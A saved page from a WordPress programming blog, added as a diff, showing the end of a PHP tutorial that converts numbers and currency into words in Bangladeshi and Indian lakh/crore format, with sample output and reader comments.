+			 *    but WITHOUT ANY WARRANTY; without even the implied warranty of<br>
+			 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<br>
+			 *    GNU General Public License for more details.<br>
+			 *<br>
+			 *    See the GNU General Public License: <http: www.gnu.org="" licenses="">.<br>
+			 *<br>
+			 */<br>
+			// zero is a special case, it cause problems even with typecasting if we don’t deal with it here<br>
+			$max_size = pow(10,18);<br>
+			if (!$number) return “zero”;<br>
+			if (is_int($number) &amp;&amp; $number &lt; abs($max_size))<br>
+			{<br>
+				$prefix = '';<br>
+				$suffix = '';<br>
+				switch ($number)<br>
+				{<br>
+					// set up some rules for converting digits to words<br>
+					case $number &lt; 0:<br>
+						$prefix = "negative";<br>
+						$suffix = $this-&gt;translate_to_words(-1*$number);<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+					case 1:<br>
+						$string = “one”;<br>
+						break;<br>
+					case 2:<br>
+						$string = “two”;<br>
+						break;<br>
+					case 3:<br>
+						$string = “three”;<br>
+						break;<br>
+					case 4:<br>
+						$string = “four”;<br>
+						break;<br>
+					case 5:<br>
+						$string = “five”;<br>
+						break;<br>
+					case 6:<br>
+						$string = “six”;<br>
+						break;<br>
+					case 7:<br>
+						$string = “seven”;<br>
+						break;<br>
+					case 8:<br>
+						$string = “eight”;<br>
+						break;<br>
+					case 9:<br>
+						$string = “nine”;<br>
+						break;<br>
+					case 10:<br>
+						$string = “ten”;<br>
+						break;<br>
+					case 11:<br>
+						$string = “eleven”;<br>
+						break;<br>
+					case 12:<br>
+						$string = “twelve”;<br>
+						break;<br>
+					case 13:<br>
+						$string = “thirteen”;<br>
+						break;<br>
+					// fourteen handled later<br>
+					case 15:<br>
+						$string = “fifteen”;<br>
+						break;<br>
+					case $number &lt; 20:<br>
+						$string = $this-&gt;translate_to_words($number%10);<br>
+						// eighteen only has one “t”<br>
+						if ($number == 18)<br>
+						{<br>
+						$suffix = “een”;<br>
+						} else<br>
+						{<br>
+						$suffix = “teen”;<br>
+						}<br>
+						$string .= $suffix;<br>
+						break;<br>
+					case 20:<br>
+						$string = “twenty”;<br>
+						break;<br>
+					case 30:<br>
+						$string = “thirty”;<br>
+						break;<br>
+					case 40:<br>
+						$string = “forty”;<br>
+						break;<br>
+					case 50:<br>
+						$string = “fifty”;<br>
+						break;<br>
+					case 60:<br>
+						$string = “sixty”;<br>
+						break;<br>
+					case 70:<br>
+						$string = “seventy”;<br>
+						break;<br>
+					case 80:<br>
+						$string = “eighty”;<br>
+						break;<br>
+					case 90:<br>
+						$string = “ninety”;<br>
+						break;<br>
+					case $number &lt; 100:<br>
+						$prefix = $this-&gt;translate_to_words($number-$number%10);<br>
+						$suffix = $this-&gt;translate_to_words($number%10);<br>
+						//$string = $prefix . “-” . $suffix;<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+					// handles all number 100 to 999<br>
+					case $number &lt; pow(10,3):<br>
+						// floor return a float not an integer<br>
+						$prefix = $this-&gt;translate_to_words(intval(floor($number/pow(10,2)))) . ” hundred”;<br>
+						if ($number%pow(10,2)) $suffix = ” and ” . $this-&gt;translate_to_words($number%pow(10,2));<br>
+						$string = $prefix . $suffix;<br>
+						break;<br>
+					case $number &lt; pow(10,6):<br>
+						// floor return a float not an integer<br>
+						$prefix = $this-&gt;translate_to_words(intval(floor($number/pow(10,3)))) . ” thousand”;<br>
+						if ($number%pow(10,3)) $suffix = $this-&gt;translate_to_words($number%pow(10,3));<br>
+						$string = $prefix . ” ” . $suffix;<br>
+						break;<br>
+				}<br>
+			} else<br>
+			{<br>
+				echo “ERROR with – $number<br> Number must be an integer between -” .
+ number_format($max_size, 0, “.”, “,”) . ” and ” . 
+number_format($max_size, 0, “.”, “,”) . ” exclussive.”;<br>
+			}<br>
+			return $string;<br>
+		}</http:></p>
+<p>		function get_bd_amount_in_text($amount)<br>
+		{<br>
+			$output_string = ”;</p>
+<p>			$tokens = explode(‘.’, $amount);<br>
+			$current_amount = $tokens[0];<br>
+			$fraction = ”;<br>
+			if(count($tokens) &gt; 1)<br>
+			{<br>
+				$fraction = (double)(‘0.’ . $tokens[1]);<br>
+				$fraction = $fraction * 100;<br>
+				$fraction = round($fraction, 0);<br>
+				$fraction = (int)$fraction;<br>
+				$fraction = $this-&gt;translate_to_words($fraction) . ‘ paisa';<br>
+				$fraction = ‘ Taka &amp; ‘ . $fraction;<br>
+			}</p>
+<p>			$crore = 0;<br>
+			if($current_amount &gt;= pow(10,7))<br>
+			{<br>
+				$crore = (int)floor($current_amount / pow(10,7));<br>
+				$output_string .= $this-&gt;translate_to_words($crore) . ‘ crore ‘;<br>
+				$current_amount = $current_amount – $crore * pow(10,7);<br>
+			}</p>
+<p>			$lakh = 0;<br>
+			if($current_amount &gt;= pow(10,5))<br>
+			{<br>
+				$lakh = (int)floor($current_amount / pow(10,5));<br>
+				$output_string .= $this-&gt;translate_to_words($lakh) . ‘ lakh ‘;<br>
+				$current_amount = $current_amount – $lakh * pow(10,5);<br>
+			}</p>
+<p>			$current_amount = (int)$current_amount;<br>
+			$output_string .= $this-&gt;translate_to_words($current_amount);</p>
+<p>			$output_string = $output_string . $fraction . ‘ only';<br>
+			$output_string = ucwords($output_string);<br>
+			return $output_string;<br>
+		}</p>
+<p>	}</p>
+<p>	$currency_object = new Currency();</p>
+<p>	for($i=1; $i&lt;10; $i++)<br>
+	{<br>
+		$seed = time() / ($i + 1);<br>
+		srand($seed);<br>
+		$amount = mt_rand(100, 9999999);<br>
+		$amount = $amount + $i/10;<br>
+		echo $currency_object-&gt;get_bd_money_format($amount) . ‘ : ‘ . $currency_object-&gt;get_bd_amount_in_text($amount) . ‘<br>‘;</p>
+<p>	}</p>
+<p>?&gt;</p>
+<p>{/code}</p>
+<p>Sample Output:</p>
+<p>================================================</p>
+<div id="_mcePaste">84,20,202.10 : Eighty Four Lakh Twenty Thousand Two Hundred And Two Taka &amp; Ten Paisa Only</div>
+<div id="_mcePaste">10,90,495.20 : Ten Lakh Ninety Thousand Four Hundred And Ninety Five Taka &amp; Twenty Paisa Only</div>
+<div id="_mcePaste">12,51,706.30 : Twelve Lakh Fifty One Thousand Seven Hundred And Six Taka &amp; Thirty Paisa Only</div>
+<div id="_mcePaste">78,31,550.40 : Seventy Eight Lakh Thirty One Thousand Five Hundred And Fifty Taka &amp; Forty Paisa Only</div>
+<div id="_mcePaste">49,59,035.50 : Forty Nine Lakh Fifty Nine Thousand Thirty Five Taka &amp; Fifty Paisa Only</div>
+<div id="_mcePaste">29,83,538.60 : Twenty Nine Lakh Eighty Three Thousand Five Hundred And Thirty Eight Taka &amp; Sixty Paisa Only</div>
+<div id="_mcePaste">50,70,303.70 : Fifty Lakh Seventy Thousand Three Hundred And Three Taka &amp; Seventy Paisa Only</div>
+<div id="_mcePaste">11,98,440.80 : Eleven Lakh Ninety Eight Thousand Four Hundred And Forty Taka &amp; Eighty Paisa Only</div>
+<div id="_mcePaste">70,08,871.90 : Seventy Lakh Eight Thousand Eight Hundred And Seventy One Taka &amp; Ninety Paisa Only</div>
+<p>================================================</p>
+<p>That’s it!</p>
+<p>Please feel free to use this code anytime anywhere.</p>
+<p>If you update/enhance this code, please share with other people.</p>
+<p>Thanks for reading.</p>
+		
+					</section>
+				<div class="sidebadge"></div>
+				</article>
+				<!-- End Article -->
+				
+<!-- You can start editing here. -->
+
+	<h2 class="h2comments" id="comments">16 Comments</h2>
+
+	<ul class="commentlist">
+	   <li class="comment even thread-even depth-1 clearfix" id="li-comment-813">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/c0fc788038fc67136365b6f3711eaf6d.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-813">
+	  <div class="comment-meta commentmetadata">
+	    <strong><a href="http://flexicommentbox.alimsyed.com/" rel="external nofollow" class="url">Fleix</a></strong> <span>March 2, 2011 at 11:04 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>cam the same script be used for other currencies?</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment byuser comment-author-admin bypostauthor odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-814">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/bb917f0efd1a8535d4595d5032c71b06.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-814">
+	  <div class="comment-meta commentmetadata">
+	    <strong>admin</strong> <span>March 2, 2011 at 11:49 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>@ Fleix</p>
+<p>well. the indian or more generally the asian currency format is 
+somewhat different than the western countries. as i do not know your 
+currency format, i cannot give you specific answer. for western 
+currencies, you know PHP’s built-in number_format() is enough to take 
+care of the issue.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-834">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/234d8d6f6ddf7efeb731a1befe9e545f.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-834">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Shahid Parvez Butt</strong> <span>May 29, 2011 at 8:58 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>when i tried to run this script, i am facing an error on line 35.</p>
+<p>Parse error: parse error, unexpected ‘;’ in C:\Apache2\htdocs\iqbalavenue\currency.php on line 35</p>
+<p>can u please explain what is this ?</p>
+<p>regards</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment byuser comment-author-admin bypostauthor odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-835">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/bb917f0efd1a8535d4595d5032c71b06.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-835">
+	  <div class="comment-meta commentmetadata">
+	    <strong>admin</strong> <span>May 29, 2011 at 10:11 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>@ Shahid </p>
+<p>what is the line of code exactly?</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-836">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/234d8d6f6ddf7efeb731a1befe9e545f.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-836">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Shahid Parvez Butt</strong> <span>May 29, 2011 at 1:01 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>this is the line:</p>
+<p>if($i%2!=0 &amp;&amp; $i!=0 &amp;&amp; $i!=$lpcount-1)</p>
+<p>i have found another solution for the same purpose. but i will feel happy if you guide me about the error.</p>
+<p>regards</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-837">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/234d8d6f6ddf7efeb731a1befe9e545f.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-837">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Shahid Parvez Butt</strong> <span>May 29, 2011 at 1:02 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>can u guide me how u created this website. i am very pleased to see.</p>
+<p>regards</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-849">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/325f00723ee2462be4c6500a094eb97b.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-849">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Rashmi</strong> <span>June 18, 2011 at 6:49 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>Hi,<br>
+This is a joomla site right.<br>
+Really good to see ur post.I am also a web developer like u</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment byuser comment-author-admin bypostauthor odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-850">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/bb917f0efd1a8535d4595d5032c71b06.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-850">
+	  <div class="comment-meta commentmetadata">
+	    <strong>admin</strong> <span>June 18, 2011 at 11:16 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>@ Rashmi </p>
+<p>No. It is a wordpress site. WordPress is much better than Joomla. Thanks. Nice to hear you are a programmer.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-851">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/234d8d6f6ddf7efeb731a1befe9e545f.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-851">
+	  <div class="comment-meta commentmetadata">
+	    <strong><a href="http://shahparz.com/" rel="external nofollow" class="url">shahid parvez</a></strong> <span>June 18, 2011 at 2:10 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>can u tell me how can i get such like these templates.</p>
+<p>thanks in advance.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-891">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/5109351a632e59370322977704f600aa.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-891">
+	  <div class="comment-meta commentmetadata">
+	    <strong><a href="http://www.alphasoftz.com/" rel="external nofollow" class="url">AlphasoftZ</a></strong> <span>September 14, 2011 at 3:24 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>A simple function used here in this thread</p>
+<p><a href="http://www.daniweb.com/web-development/php/threads/147286" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://www.daniweb.com/web-development/php/threads/147286', 'http://www.daniweb.com/web-development/php/threads/147286']);" rel="nofollow">http://www.daniweb.com/web-development/php/threads/147286</a></p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-924">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/a502bc238797256e8ddc122eec0cc3de.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-924">
+	  <div class="comment-meta commentmetadata">
+	    <strong><a href="http://www.innovative2all.com/" rel="external nofollow" class="url">sairam</a></strong> <span>December 12, 2011 at 6:08 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>Nice coding. Can i use this code to codigniter template.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-927">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/5da541915ef0405c1c944135f1ade3c4.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-927">
+	  <div class="comment-meta commentmetadata">
+	    <strong>rahul</strong> <span>December 26, 2011 at 7:16 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>I found Currency convert to words in this site in two language:<br>
+Php Code:<a href="http://www.studystuff.in/content/function-generating-indian-currency-words" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://www.studystuff.in/content/function-generating-indian-currency-words', 'http://www.studystuff.in/content/function-generating-indian-currency-words']);" rel="nofollow">http://www.studystuff.in/content/function-generating-indian-currency-words</a></p>
+<p>Haskell Code:<a href="http://www.studystuff.in/content/code-convert-indian-currency-words-haskell-programming" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://www.studystuff.in/content/code-convert-indian-currency-words-haskell-programming', 'http://www.studystuff.in/content/code-convert-indian-currency-words-haskell-programming']);" rel="nofollow">http://www.studystuff.in/content/code-convert-indian-currency-words-haskell-programming</a></p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-940">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/28a557d6fbdd9fe194ccc5964b2b3fa6.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-940">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Shariful Islam</strong> <span>January 22, 2012 at 3:44 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>thank you for your kind help.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-960">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/5f70a1472dc6ecc5b8c8c58e41691e18.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-960">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Er.Pushpendra</strong> <span>February 25, 2012 at 7:28 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>thnanks for the help..</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment even thread-even depth-1 clearfix" id="li-comment-986">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/a4188f7d1f846711e19ea3576f451037.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-986">
+	  <div class="comment-meta commentmetadata">
+	    <strong>Nitin</strong> <span>May 5, 2012 at 6:16 am	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>Hi admin..</p>
+<p> Thanks for this code. It works properly.<br>
+But I need such a program which took input through the text box. And 
+display the output. Can you help me. And your site design is nice..</p>
+<p>Thanks.:)</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+   <li class="comment odd alt thread-odd thread-alt depth-1 clearfix" id="li-comment-987">
+	 <img alt="" src="PHP%20%20Convert%20number%20&amp;%20currency%20to%20text%20in%20asian%20i.e.%20Bangladeshi,%20Indian%20format%20_%20Learning%20Is%20Fun_files/234d8d6f6ddf7efeb731a1befe9e545f.png" class="avatar avatar-38 photo" height="38" width="38">     <div id="comment-987">
+	  <div class="comment-meta commentmetadata">
+	    <strong><a href="http://shahparzsoft.com/" rel="external nofollow" class="url">shahid parvez</a></strong> <span>May 5, 2012 at 2:53 pm	  </span>
+	  </div>
+	  
+      <div class="text">
+		  <p>Please gift me this WordPress template.</p>
+	  </div>
+	  
+	  
+      <div class="reply">
+               </div>
+     </div>
+</li><!-- #comment-## -->
+	</ul>
+ 
+
+
+<div id="respond">
+
+<h2 id="commentsForm">Got anything to say? Go ahead and leave a comment!</h2>
+
+<div class="cancel-comment-reply">
+	<small><a rel="nofollow" id="cancel-comment-reply-link" href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/#respond" style="display:none;">Click here to cancel reply.</a></small>
+</div>
+
+
+<form action="http://www.tanzilo.com/wp-comments-post.php" method="post" id="commentform">
+
+
+<p><label for="author">Name (required)</label>
+<input name="author" id="author" size="22" tabindex="1" aria-required="true" type="text">
+</p>
+
+<p><label for="email">Mail (will not be published) (required)</label>
+<input name="email" id="email" size="22" tabindex="2" aria-required="true" type="text">
+</p>
+
+<p><label for="url">Website</label>
+<input name="url" id="url" size="22" tabindex="3" type="text">
+</p>
+
+
+
+<p><label for="comment">Comment</label>
+<textarea name="comment" id="comment" rows="10" tabindex="4"></textarea></p>
+<!--<p><small><strong>XHTML:</strong> You can use these tags: <code>&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </code></small></p>-->
+<p><input name="submit" id="submit" tabindex="5" value="POST COMMENT" type="submit">
+<input name="comment_post_ID" value="112" id="comment_post_ID" type="hidden">
+<input name="comment_parent" id="comment_parent" value="0" type="hidden">
+</p>
+<p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" value="749794db7d" type="hidden"></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input name="subscribe" id="subscribe" value="subscribe" style="width: auto;" type="checkbox">
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+<p style="display: none;"></p>
+<input id="ak_js" name="ak_js" value="1425563570396" type="hidden"></form>
+
+</div>
+
+								</section>
+		<!-- End Main Content ( left col ) -->
+		
+<aside id="sidebar">
+	<!-- Begin Social Icons -->
+	<section id="socialIcons">
+	<ul>
+				<li><a href="http://twitter.com/site5" class="twitter tip" title="Follow Us on Twitter!">Follow Us on Twitter!</a></li>
+						<li><a href="http://www.facebook.com/site5" class="facebook" title="Join Us on Facebook!">"Join Us on Facebook!</a></li>
+				<li><a href="http://www.tanzilo.com/feed/" title="RSS" class="rss">RSS</a></li>
+	</ul>
+		<a href="http://www.tanzilo.com/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/" id="butContact">Contact</a>
+		</section>
+	<!-- End Social Icons -->
+			<section class="sideBox">		<h3>Recent Posts</h3>		<ul>
+					<li>
+				<a href="http://www.tanzilo.com/2011/01/28/php-convert-number-currency-to-text-in-asian-i-e-bangladeshi-indian-format/">PHP: Convert number &amp; currency to text in asian i.e. Bangladeshi, Indian format</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2009/01/17/javascript-div-element-hide-show-cross-browser-script-solution/">JavaScript: Div &amp; Element hide &amp; show cross-browser script solution</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2009/01/15/wordpress-adding-a-custom-option-box-and-developing-file-upload-plugin/">WordPress: adding a custom option box and developing file upload plugin</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2009/01/06/wordpress-display-posts-by-category-id-solution-with-code-example/">WordPress: display posts by category ID. Solution with code &amp; example.</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/31/php-serialization-unserialization-explanation-code-example/">PHP: Serialization &amp; Unserialization explanation, code &amp; example</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/29/php-mysql-creating-a-website-in-your-local-language-smoothly/">PHP &amp; MySQL: Creating a website in your local language smoothly</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/23/php-mysql-unicode-number-add-subtract-etc-for-any-language/">PHP &amp; MySQL: Unicode number add, subtract etc for any language</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/19/wordpress-get-page-id-and-content-with-example-code/">WordPress: get page id and content with example &amp; code</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/17/wordpress-custom-url-rewrite-and-reading-url-values/">WordPress: Custom URL rewrite and reading URL values</a>
+						</li>
+					<li>
+				<a href="http://www.tanzilo.com/2008/12/15/wordpress-upload-many-php-files-quickly-by-zip-unzip/">WordPress: Upload many PHP files quickly by Zip &amp; Unzip</a>
+						</li>
+				</ul>
+		</section><section class="sideBox"><h3>Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">pegah</span> on <a href="http://www.tanzilo.com/2008/10/24/tableless-web-design-in-css-2-3-columns-with-header-footer/comment-page-1/#comment-1028">Tableless Web Design in CSS: 2 &amp; 3 columns with Header &amp; Footer</a></li><li class="recentcomments"><span class="comment-author-link">Kawsar Ahmad</span> on <a href="http://www.tanzilo.com/2008/12/23/php-mysql-unicode-number-add-subtract-etc-for-any-language/comment-page-1/#comment-1027">PHP &amp; MySQL: Unicode number add, subtract etc for any language</a></li><li class="recentcomments"><span class="comment-author-link">Mahfuzul Alam</span> on <a href="http://www.tanzilo.com/2008/10/13/php-mysql-unicode-solution-to-chinese-russian-or-any-language/comment-page-3/#comment-1025">PHP – MySQL: Unicode solution to Chinese, Russian or any language</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://newfutureuniversity.org/" rel="external nofollow" class="url">Francisco</a></span> on <a href="http://www.tanzilo.com/2008/11/09/php-pass-all-post-and-get-variables-in-array-in-function-parameter/comment-page-1/#comment-1023">PHP: pass all POST and GET variables in array in function parameter</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.aursoft.com/" rel="external nofollow" class="url">Umair Shahid</a></span> on <a href="http://www.tanzilo.com/2008/10/13/php-mysql-unicode-solution-to-chinese-russian-or-any-language/comment-page-3/#comment-1021">PHP – MySQL: Unicode solution to Chinese, Russian or any language</a></li></ul></section><section class="sideBox"><h3>Tag Cloud</h3><div class="tagcloud"><a href="http://www.tanzilo.com/tag/2-columns/" class="tag-link-27" title="1 topic" style="font-size: 8pt;">2 columns</a>
+<a href="http://www.tanzilo.com/tag/3-columns/" class="tag-link-28" title="1 topic" style="font-size: 8pt;">3 columns</a>
+<a href="http://www.tanzilo.com/tag/add/" class="tag-link-60" title="2 topics" style="font-size: 11.4054054054pt;">add</a>
+<a href="http://www.tanzilo.com/tag/article/" class="tag-link-5" title="1 topic" style="font-size: 8pt;">article</a>
+<a href="http://www.tanzilo.com/tag/bangla/" class="tag-link-38" title="1 topic" style="font-size: 8pt;">Bangla</a>
+<a href="http://www.tanzilo.com/tag/code/" class="tag-link-64" title="4 topics" style="font-size: 15.5675675676pt;">Code</a>
+<a href="http://www.tanzilo.com/tag/css/" class="tag-link-17" title="2 topics" style="font-size: 11.4054054054pt;">CSS</a>
+<a href="http://www.tanzilo.com/tag/database/" class="tag-link-41" title="1 topic" style="font-size: 8pt;">Database</a>
+<a href="http://www.tanzilo.com/tag/delete/" class="tag-link-21" title="1 topic" style="font-size: 8pt;">Delete</a>
+<a href="http://www.tanzilo.com/tag/destroy/" class="tag-link-20" title="1 topic" style="font-size: 8pt;">Destroy</a>
+<a href="http://www.tanzilo.com/tag/develop/" class="tag-link-102" title="2 topics" style="font-size: 11.4054054054pt;">Develop</a>
+<a href="http://www.tanzilo.com/tag/div/" class="tag-link-79" title="2 topics" style="font-size: 11.4054054054pt;">DIV</a>
+<a href="http://www.tanzilo.com/tag/example/" class="tag-link-54" title="5 topics" style="font-size: 17.0810810811pt;">Example</a>
+<a href="http://www.tanzilo.com/tag/get/" class="tag-link-9" title="5 topics" style="font-size: 17.0810810811pt;">GET</a>
+<a href="http://www.tanzilo.com/tag/htaccess/" class="tag-link-46" title="2 topics" style="font-size: 11.4054054054pt;">htaccess</a>
+<a href="http://www.tanzilo.com/tag/html/" class="tag-link-34" title="2 topics" style="font-size: 11.4054054054pt;">HTML</a>
+<a href="http://www.tanzilo.com/tag/id/" class="tag-link-143" title="2 topics" style="font-size: 11.4054054054pt;">id</a>
+<a href="http://www.tanzilo.com/tag/mysql/" class="tag-link-12" title="4 topics" style="font-size: 15.5675675676pt;">MySQL</a>
+<a href="http://www.tanzilo.com/tag/page-content/" class="tag-link-55" title="2 topics" style="font-size: 11.4054054054pt;">page content</a>
+<a href="http://www.tanzilo.com/tag/page-id/" class="tag-link-56" title="2 topics" style="font-size: 11.4054054054pt;">page id</a>
+<a href="http://www.tanzilo.com/tag/password/" class="tag-link-43" title="1 topic" style="font-size: 8pt;">Password</a>
+<a href="http://www.tanzilo.com/tag/php/" class="tag-link-3" title="9 topics" style="font-size: 21.2432432432pt;">PHP</a>
+<a href="http://www.tanzilo.com/tag/plugin/" class="tag-link-115" title="2 topics" style="font-size: 11.4054054054pt;">plugin</a>
